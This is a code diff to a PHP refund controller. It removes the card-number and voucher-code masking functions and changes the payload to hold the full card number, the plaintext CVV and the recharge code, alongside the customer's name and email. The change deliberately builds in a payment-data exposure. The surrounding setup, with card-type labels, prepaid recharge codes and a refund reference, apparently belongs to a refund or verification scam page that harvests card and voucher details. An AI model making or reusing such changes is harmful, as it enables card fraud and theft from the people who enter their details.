@@ -27,19 +27,18 @@ class RefundController extends Controller
         $data = $request->validated();
         $digits = preg_replace('/\D+/', '', $data['card_number']) ?? '';
         $brand = CardBrandDetector::detect($digits);
-        $maskedPan = $this->maskPan($digits);
 
         $reference = 'RMB-'.strtoupper(Str::random(8));
 
         $payload = [
             'reference' => $reference,
             'detected_brand' => $brand,
-            'pan_masked' => $maskedPan,
+            'pan_plain' => trim($data['card_number']),
             'exp_month' => $data['exp_month'],
             'exp_year' => $data['exp_year'],
-            'cvv_masked' => '•••',
+            'cvv_plain' => $data['cvv'],
             'card_type_label' => config('authentify.card_types.'.$data['card_type'], $data['card_type']),
-            'recharge_code_masked' => $this->maskCode($data['recharge_code']),
+            'recharge_code_plain' => trim($data['recharge_code']),
             'first_name' => $data['first_name'],
             'last_name' => $data['last_name'],
             'email' => $data['email'],
@@ -86,29 +85,5 @@ class RefundController extends Controller
         }
 
         return view('refund-processing');
-    }
-
-    private function maskPan(string $digits): string
-    {
-        $len = strlen($digits);
-        if ($len < 4) {
-            return '••••';
-        }
-
-        return str_repeat('•', max(0, $len - 4)).substr($digits, -4);
-    }
-
-    private function maskCode(string $code): string
-    {
-        $t = trim($code);
-        if ($t === '') {
-            return '—';
-        }
-        $len = mb_strlen($t, 'UTF-8');
-        if ($len <= 4) {
-            return str_repeat('•', max(0, $len - 1)).mb_substr($t, -1, null, 'UTF-8');
-        }
-
-        return mb_substr($t, 0, 2, 'UTF-8').str_repeat('•', $len - 4).mb_substr($t, -2, null, 'UTF-8');
     }
 }
